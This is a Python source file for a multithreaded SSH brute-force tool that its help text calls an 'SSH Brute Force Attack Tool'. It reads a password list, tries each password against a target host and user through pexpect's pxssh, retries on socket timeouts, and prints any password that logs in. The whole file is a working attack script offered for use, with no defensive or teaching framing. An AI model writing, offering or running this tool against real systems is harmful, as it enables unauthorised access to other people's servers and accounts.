import argparse
import threading
from threading import BoundedSemaphore
import time
from pexpect import pxssh
import sys

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def connect(host, user, password, release=True):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print(f'[+] Password Found: {password}')
        Found = True
    except pxssh.ExceptionPxssh as e:
        if 'password refused' in str(e):
            pass  # Password failed, return and try the next one
        elif 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)  # Wait a bit and try the same password again
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)  # Wait and allow to catch up with the prompt
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()

def main(host, user, passwordFile):
    global connection_lock

    # Load the password list
    try:
        passwords = open(passwordFile).read().splitlines()
    except Exception as e:
        print(f"[-] Error opening password file: {e}")
        return

    for password in passwords:
        if Found:
            print("[*] Exiting: Password Found")
            exit(0)
        if Fails > 5:
            print("[!] Exiting: Too Many Socket Timeouts")
            exit(1)
        
        connection_lock.acquire()
        print(f"[-] Testing password: {password}")
        t = threading.Thread(target=connect, args=(host, user, password))
        t.start()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='SSH Brute Force Attack Tool')
    parser.add_argument('host', type=str, help='Hostname or IP Address')
    parser.add_argument('user', type=str, help='Username for SSH')
    parser.add_argument('passwordFile', type=str, help='Password file for brute force attack')
    args = parser.parse_args()

    main(args.host, args.user, args.passwordFile)
